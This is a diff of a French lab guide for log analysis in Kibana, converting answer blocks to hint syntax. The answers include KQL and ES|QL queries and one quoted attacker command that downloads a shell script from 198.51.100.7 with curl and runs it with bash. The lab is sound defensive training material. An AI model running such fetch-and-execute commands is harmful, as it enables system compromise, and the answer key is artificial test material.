@@ -103,12 +103,9 @@ Vous devez voir **25** événements.
 2. Cliquez sur le champ `host.name` dans la liste : combien d'hôtes ?
 3. Enregistrez la recherche : **Save** → `Lab - all events`.
 
-<details>
-<summary>Réponse</summary>
-
+:::hint[Réponse]
 Trois hôtes : `ws-02`, `web-01`, `db-01`.
-
-</details>
+:::
 
 ## Exercice 3 — KQL
 
@@ -119,15 +116,12 @@ Trois hôtes : `ws-02`, `web-01`, `db-01`.
 3. Les processus dont la ligne de commande contient `-enc`.
 4. Les connexions vers un port supérieur ou égal à 443 venant de `ws-02`.
 
-<details>
-<summary>Réponse</summary>
-
+:::hint[Réponse]
 1. `event.category: authentication and event.outcome: failure` — 5 événements
 2. `event.outcome: failure and user.name: admin and not source.ip: 10.0.0.0/8` — 5
 3. `process.command_line: *-enc*` — 1
 4. `host.name: ws-02 and event.category: network and destination.port >= 443` — 9
-
-</details>
+:::
 
 ## Exercice 4 — Lucene
 
@@ -176,12 +170,9 @@ Résultat attendu :
 2. Sur `host.name`, **Filter for value** ; videz la requête : le filtre reste.
 3. Ouvrez **View surrounding documents** : que fait `admin` juste après sa connexion ?
 
-<details>
-<summary>Réponse</summary>
-
+:::hint[Réponse]
 Il télécharge un script (`curl -s http://198.51.100.7/x.sh -o /tmp/x.sh`) et l'exécute (`bash /tmp/x.sh`).
-
-</details>
+:::
 
 ## Exercice 6 — ES|QL
 
@@ -190,9 +181,7 @@ Passez Discover en mode **ES|QL** et répondez :
 1. Quels processus parlent à quelles IP, et combien de fois ?
 2. Quel hôte a envoyé le plus d'octets vers l'extérieur ?
 
-<details>
-<summary>Réponse</summary>
-
+:::hint[Réponse]
 ```json
 POST /_query?format=json&filter_path=values
 {
@@ -229,8 +218,7 @@ Résultat attendu :
 ```json
 { "values": [[48005120, "ws-02"]] }
 ```
-
-</details>
+:::
 
 ## Exercice 7 — KQL dans ES|QL
 
